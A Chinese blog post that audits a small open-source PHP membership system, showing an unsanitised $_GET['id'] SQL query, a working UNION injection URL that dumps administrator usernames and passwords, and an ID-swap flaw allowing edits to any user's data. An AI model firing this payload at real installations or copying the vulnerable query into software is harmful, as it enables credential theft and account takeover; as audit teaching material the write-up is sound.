这段时间在想着做个高校的会员管理系统，所以在chrome上装了个掘金插件，今天发现日推推了个类似的PHP写的小程序  
![image.png](https://image.3001.net/images/20181206/1544084785_5c08dd315001b.png!small)

本着能省就省，有自行车还造什么轮子的原则

于是乎

    
    
    git clone https://github.com/chaodada/member.git

经过简单的部署后算是能打开了  

![image.png](https://image.3001.net/images/20181206/1544084825_5c08dd5959a46.png!small)![image.png](https://image.3001.net/images/20181206/1544084841_5c08dd692351d.png!small)![image.png](https://image.3001.net/images/20181206/1544084853_5c08dd75013f2.png!small)后台UI做的真心差评  

![image.png](https://image.3001.net/images/20181206/1544084870_5c08dd86dabe9.png!small)然后简单的看了下代码，发现几个SQL注入和一个越权  

# SQL注入

程序使用PDO连接数据库，后台使用了预编译SQL指令，没多大问题

看看前台用户处

xiu.php

![image.png](https://image.3001.net/images/20181206/1544084896_5c08dda069992.png!small)

    
    
    if (isset($_GET['id'])) {
        $sql = "select id,username,password,integral,**,email from u_users WHERE 1=1 and id={$_GET['id']} ";
        $res = $pdo->query($sql);
        list($id, $username, $password, $integral, $**, $email) = $res->fetch(PDO::FETCH_NUM);
    }

很明显的GET型注入  
爆管理员密码的payload:

    
    
    http://localhost/member-master/member-master/user/xiu_user.php?id=-37 union select 1,2,group_concat(username,0x2a,password,0x20,mpw),4,5,6 from memsystem.u_admin %23

![image.png](https://image.3001.net/images/20181206/1544084923_5c08ddbb94ad9.png!small)

# 越权

同样还是刚才那个位置  
![image.png](https://image.3001.net/images/20181206/1544084992_5c08de00e88e2.png!small)![image.png](https://image.3001.net/images/20181206/1544085001_5c08de092418d.png!small)id修改后即可更改任意用户信息  

# 总结

这套程序距离实用还有不小的距离 适合入门级选手审计练手  
程序下载地址：<https://github.com/chaodada/member.git>

  

